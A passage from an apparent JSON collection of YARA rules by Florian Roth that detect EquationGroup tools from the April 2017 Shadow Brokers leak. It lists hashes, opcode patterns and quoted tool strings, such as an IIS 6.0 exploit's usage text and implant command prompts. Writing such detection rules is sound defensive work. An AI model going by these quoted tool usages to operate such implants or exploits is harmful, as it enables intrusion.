  "EquationGroup_Toolset_Apr17_greatdoc_dll_config": "rule EquationGroup_Toolset_Apr17_greatdoc_dll_config {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"fd9d0abfa727784dd07562656967d220286fc0d63bcf7e2c35d4c02bc2e5fc2e\"\n   strings:\n      $x1 = \"C:\\\\Projects\\\\GREATERDOCTOR\\\\trunk\\\\GREATERDOCTOR\" ascii\n      $x2 = \"src\\\\build\\\\Release\\\\dllConfig\\\\dllConfig.pdb\" ascii\n      $x3 = \"GREATERDOCTOR [ commandline args configuration ]\" fullword ascii\n      $x4 = \"-useage: <scanner> \\\"<cmdline args>\\\"\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_scanner": "rule EquationGroup_Toolset_Apr17_scanner {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f180bdb247687ea9f1b58aded225d5c80a13327422cd1e0515ea891166372c53\"\n   strings:\n      $x1 = \"+daemon_version,system,processor,refid,clock\" fullword ascii\n      $x2 = \"Usage: %s typeofscan IP_address\" fullword ascii\n      $x3 = \"# scanning ip  %d.%d.%d.%d\" fullword ascii\n      $x4 = \"Welcome to the network scanning tool\" fullword ascii\n      $x5 = \"***** %s ***** (length %d)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std": "rule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"087db4f2dbf8e0679de421fec8fb2e6dd50625112eb232e4acc1408cc0bcd2d7\"\n   strings:\n      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 }\n      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 }\n      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_tacothief": "rule EquationGroup_Toolset_Apr17_tacothief {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c71953cc84c27dc61df8f6f452c870a7880a204e9e21d9fd006a5c023b052b35\"\n   strings:\n      $x1 = \"File too large!  Must be less than 655360 bytes.\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_ntevt": "rule EquationGroup_Toolset_Apr17_ntevt {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf\"\n   strings:\n      $x1 = \"c:\\\\ntevt.pdb\" fullword ascii\n\n      $s1 = \"ARASPVU\" fullword ascii\n\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }\n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }\n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )\n}",
  "EquationGroup_Toolset_Apr17_Processes_Target": "rule EquationGroup_Toolset_Apr17_Processes_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"69cf7643dbecc5f9b4b29edfda6c0295bc782f0e438f19be8338426f30b4cc74\"\n   strings:\n      $s1 = \"Select * from Win32_Process\" fullword ascii\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s5 = \"%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_st_lp": "rule EquationGroup_Toolset_Apr17_st_lp {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"3b6f756cca096548dcad2b6c241c1dafd16806c060bec82a530f4d38755286a2\"\n   strings:\n      $x1 = \"Previous command: set injection processes (status=0x%x)\" fullword ascii\n      $x2 = \"Secondary injection process is <null> [no secondary process will be used]\" fullword ascii\n      $x3 = \"Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> \" fullword ascii\n      $x4 = \"E: Execute a Command on the Implant\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_FullThreadDump": "rule EquationGroup_Toolset_Apr17_FullThreadDump {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"b68f3f32bfa6cf11145c9fb9bf0075a5ca3938ea218b1cc29ad62f7b9e043255\"\n   strings:\n      $s1 = \"FullThreadDump.class\" fullword ascii\n      $s2 = \"ThreadMonitor.class\" fullword ascii\n      $s3 = \"Deadlock$DeadlockThread.class\" fullword ascii\n   condition:\n      ( uint16(0) == 0x4b50 and filesize < 30KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_EpWrapper": "rule EquationGroup_Toolset_Apr17_EpWrapper {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"a8eed17665ee22198670e22458eb8c9028ff77130788f24f44986cce6cebff8d\"\n   strings:\n      $x1 = \"* Failed to get remote TCP socket address\" fullword wide\n      $x2 = \"* Failed to get 'LPStart' export\" fullword wide\n      $s5 = \"Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_DiBa_Target_2000": "rule EquationGroup_Toolset_Apr17_DiBa_Target_2000 {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"f9ea8ff5985b94f635d03f3aab9ad4fb4e8c2ad931137dba4f8ee8a809421b91\"\n   strings:\n      $s1 = \"0M1U1Z1p1\" fullword ascii\n\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them )\n}",
  "EquationGroup_Toolset_Apr17_DllLoad_Target": "rule EquationGroup_Toolset_Apr17_DllLoad_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"a42d5201af655e43cefef30d7511697e6faa2469dc4a74bc10aa060b522a1cf5\"\n   strings:\n      $s1 = \"BzWKJD+\" fullword ascii\n\n      $op1 = { 44 24 6c 6c 88 5c 24 6d }\n      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 }\n      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_EXPA": "rule EquationGroup_Toolset_Apr17_EXPA {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"2017176d3b5731a188eca1b71c50fb938c19d6260c9ff58c7c9534e317d315f8\"\n   strings:\n      $x1 = \"* The target is IIS 6.0 but is not running content indexing servicess,\" fullword ascii\n      $x2 = \"--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL\" fullword ascii\n      $x3 = \"By default, the shellcode will attempt to immediately connect s$\" fullword ascii\n      $x4 = \"UNEXPECTED SHELLCODE CONFIGURATION ERRORs\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_RemoteExecute_Target": "rule EquationGroup_Toolset_Apr17_RemoteExecute_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"4a649ca8da7b5499821a768c650a397216cdc95d826862bf30fcc4725ce8587f\"\n   strings:\n      $s1 = \"Win32_Process\" fullword ascii\n      $s2 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n\n      $op1 = { 83 7b 18 01 75 12 83 63 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_DS_ParseLogs": "rule EquationGroup_Toolset_Apr17_DS_ParseLogs {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"0228691d63038b072cdbf50782990d505507757efbfa87655bb2182cf6375956\"\n   strings:\n      $x1 = \"* Size (%d) of remaining capture file is too small to contain a valid header\" fullword wide\n      $x2 = \"* Capture header not found at start of buffer\" fullword wide\n      $x3 = \"Usage: %ws <capture_file> <results_prefix>\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_Oracle_Implant": "rule EquationGroup_Toolset_Apr17_Oracle_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"8e9be4960c62ed7f210ce08f291e410ce0929cd3a86fe70315d7222e3df4587e\"\n   strings:\n      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 }\n      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 }\n      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 500KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_DmGz_Target": "rule EquationGroup_Toolset_Apr17_DmGz_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"5964966041f93d5d0fb63ce4a85cf9f7a73845065e10519b0947d4a065fdbdf2\"\n   strings:\n      $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n      $s3 = \"6\\\"6<6C6H6M6Z6f6t6\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_SetResourceName": "rule EquationGroup_Toolset_Apr17_SetResourceName {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"537793d5158aecd0debae25416450bd885725adfc8ca53b0577a3df4b0222e2e\"\n   strings:\n      $x1 = \"Updates the name of the dll or executable in the resource file\" fullword ascii\n      $x2 = \"*NOTE: SetResourceName does not work with PeddleCheap versions\" fullword ascii\n      $x3 = \"2 = [appinit.dll] level4 dll\" fullword ascii\n      $x4 = \"1 = [spcss32.exe] level3 exe\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_drivers_Implant": "rule EquationGroup_Toolset_Apr17_drivers_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"ee8b048f1c6ba821d92c15d614c2d937c32aeda7b7ea0943fd4f640b57b1c1ab\"\n   strings:\n      $s1 = \".?AVFeFinallyFailure@@\" fullword ascii\n      $s2 = \"hZwLoadDriver\" fullword ascii\n\n      $op1 = { b0 01 e8 58 04 00 00 c3 33 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 30KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Shares_Target": "rule EquationGroup_Toolset_Apr17_Shares_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"6c57fb33c5e7d2dee415ae6168c9c3e0decca41ffe023ff13056ff37609235cb\"\n   strings:\n      $s1 = \"Select * from Win32_Share\" fullword ascii\n      $s2 = \"slocalhost\" fullword wide\n      $s3 = \"\\\\\\\\%ls\\\\root\\\\cimv2\" fullword wide\n      $s4 = \"\\\\\\\\%ls\\\\%ls\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_DUMPEL": "rule EquationGroup_Toolset_Apr17_DUMPEL {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"bf42532be2d36f522dca7d3d3eb40b1d25c33d508a5a37c7e28f148945136dc6\"\n   strings:\n      $x1 = \"dumpel -f file [-s \\\\\\\\server]\" fullword ascii\n      $x2 = \"records will not appear in the dumped log.\" fullword ascii\n      $x3 = \"obj\\\\i386\\\\Dumpel.exe\" fullword ascii\n      $s13 = \"DUMPEL Usage:    \" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_ntfltmgr": "rule EquationGroup_Toolset_Apr17_ntfltmgr {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"3df61b8ef42a995b8f15a0d38bc51f2f08f8d9a2afa1afc94c6f80671cf4a124\"\n      hash2 = \"f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5\"\n      hash3 = \"980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43\"\n   strings:\n      $s3 = \"wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw\" fullword ascii\n      $s6 = \"w+w;w2w0w6w4w.w(wRw\" fullword ascii\n\n      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 }\n      $op2 = { ff 15 0b 34 00 00 eb 92 }\n      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae }\n      $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 }\n      $op5 = { 8a 40 01 00 c7 47 70 }\n      $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 }\n      $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and 4 of them )\n}",
  "EquationGroup_Toolset_Apr17_DiBa_Target_BH": "rule EquationGroup_Toolset_Apr17_DiBa_Target_BH {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"7ae9a247b60dc31f424e8a7a3b3f1749ba792ff1f4ba67ac65336220021fce9f\"\n   strings:\n      $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 }\n      $op1 = { 45 33 c9 49 8d 7f 2c 41 ba }\n      $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_PC_LP": "rule EquationGroup_Toolset_Apr17_PC_LP {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"3a505c39acd48a258f4ab7902629e5e2efa8a2120a4148511fe3256c37967296\"\n   strings:\n      $s1 = \"* Failed to get connection information.  Aborting launcher!\" fullword wide\n      $s2 = \"Format: <command> <target port> [lp port]\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_RemoteCommand_Lp": "rule EquationGroup_Toolset_Apr17_RemoteCommand_Lp {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"57b47613a3b5dd820dae59fc6dc2b76656bd578f015f367675219eb842098846\"\n   strings:\n      $s1 = \"Failure parsing command from %hs:%u: os=%u plugin=%u\" fullword wide\n      $s2 = \"Unable to get TCP listen port: %08x\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_lp_mstcp": "rule EquationGroup_Toolset_Apr17_lp_mstcp {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"2ab1e1d23021d887759750a0c053522e9149b7445f840936bbc7e703f8700abd\"\n   strings:\n      $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n      $s2 = \"_PacketNDISRequestComplete@12\\\"\" fullword ascii\n      $s3 = \"_LDNdis5RegDeleteKeys@4\" fullword ascii\n\n      $op1 = { 89 7e 04 75 06 66 21 46 02 eb }\n      $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 }\n      $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and ( all of ($s*) or all of ($op*) ) )\n}",
  "EquationGroup_Toolset_Apr17_renamer": "rule EquationGroup_Toolset_Apr17_renamer {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"9c30331cb00ae8f417569e9eb2c645ebbb36511d2d1531bb8d06b83781dfe3ac\"\n   strings:\n      $s1 = \"FILE_NAME_CONVERSION.LOG\" fullword wide\n      $s2 = \"Log file exists. You must delete it!!!\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_PC_Exploit": "rule EquationGroup_Toolset_Apr17_PC_Exploit {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"77486bb828dba77099785feda0ca1d4f33ad0d39b672190079c508b3feb21fb0\"\n   strings:\n      $s1 = \"\\\\\\\\.\\\\pipe\\\\pcheap_reuse\" fullword wide\n      $s2 = \"**** FAILED TO DUPLICATE SOCKET ****\" fullword wide\n      $s3 = \"**** UNABLE TO DUPLICATE SOCKET TYPE %u ****\" fullword wide\n      $s4 = \"YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this...\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )\n}",
  "EquationGroup_Toolset_Apr17_PC_Level3_Gen": "rule EquationGroup_Toolset_Apr17_PC_Level3_Gen {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"c7dd49b98f399072c2619758455e8b11c6ee4694bb46b2b423fa89f39b185a97\"\n      hash2 = \"f6b723ef985dfc23202870f56452581a08ecbce85daf8dc7db4491adaa4f6e8f\"\n   strings:\n      $s1 = \"S-%u-%u\" fullword ascii\n      $s2 = \"Copyright (C) Microsoft\" fullword wide\n\n      $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }\n      $op2 = { 44 24 4e 41 88 5c 24 4f ff }\n      $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )\n}",
  "EquationGroup_Toolset_Apr17_put_Implant9x": "rule EquationGroup_Toolset_Apr17_put_Implant9x {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"8fcc98d63504bbacdeba0c1e8df82f7c4182febdf9b08c578d1195b72d7e3d5f\"\n   strings:\n      $s1 = \"3&3.3<3A3F3K3V3c3m3\" fullword ascii\n\n      $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 }\n      $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 20KB and 2 of them )\n}",
  "EquationGroup_Toolset_Apr17_promiscdetect_safe": "rule EquationGroup_Toolset_Apr17_promiscdetect_safe {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"6070d8199061870387bb7796fb8ccccc4d6bafed6718cbc3a02a60c6dc1af847\"\n   strings:\n      $s1 = \"running on this computer!\" fullword ascii\n      $s2 = \"- Promiscuous (capture all packets on the network)\" fullword ascii\n      $s3 = \"Active filter for the adapter:\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_PacketScan_Implant": "rule EquationGroup_Toolset_Apr17_PacketScan_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"9b97cac66d73a9d268a15e47f84b3968b1f7d3d6b68302775d27b99a56fbb75a\"\n   strings:\n      $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff }\n      $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 }\n      $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 30KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_SetPorts": "rule EquationGroup_Toolset_Apr17_SetPorts {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"722d3cf03908629bc947c4cca7ce3d6b80590a04616f9df8f05c02de2d482fb2\"\n   strings:\n      $s1 = \"USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]\" fullword ascii\n      $s2 = \"Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant": "rule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"8d2e43567e1360714c4271b75c21a940f6b26a789aa0fce30c6478ae4ac587e4\"\n   strings:\n      $s1 = \"system32\\\\winsrv.dll\" fullword wide\n      $s2 = \"raw_open CreateFile error\" fullword ascii\n      $s3 = \"\\\\dllcache\\\\\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_msgks_mskgu": "rule EquationGroup_Toolset_Apr17_msgks_mskgu {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"7b4986aee8f5c4dca255431902907b36408f528f6c0f7d7fa21f079fa0a42e09\"\n      hash2 = \"ef906b8a8ad9dca7407e0a467b32d7f7cf32814210964be2bfb5b0e6d2ca1998\"\n   strings:\n      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_Ifconfig_Target": "rule EquationGroup_Toolset_Apr17_Ifconfig_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"1ebfc0ce7139db43ddacf4a9af2cb83a407d3d1221931d359ee40588cfd0d02b\"\n   strings:\n      $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces\\\\%hs\" fullword wide\n\n      $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 }\n      $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )\n}",
  "EquationGroup_Toolset_Apr17_DiBa_Target": "rule EquationGroup_Toolset_Apr17_DiBa_Target {\n   meta:\n      description = \"Detects EquationGroup Tool - April Leak\"\n      author = \"Florian Roth\"\n      reference = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n      date = \"2017-04-15\"\n      hash1 = \"ffff3526ed0d550108e97284523566392af8523bbddb5f212df12ef61eaad3e6\"\n   strings:\n      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }\n      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }\n      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )\n}",
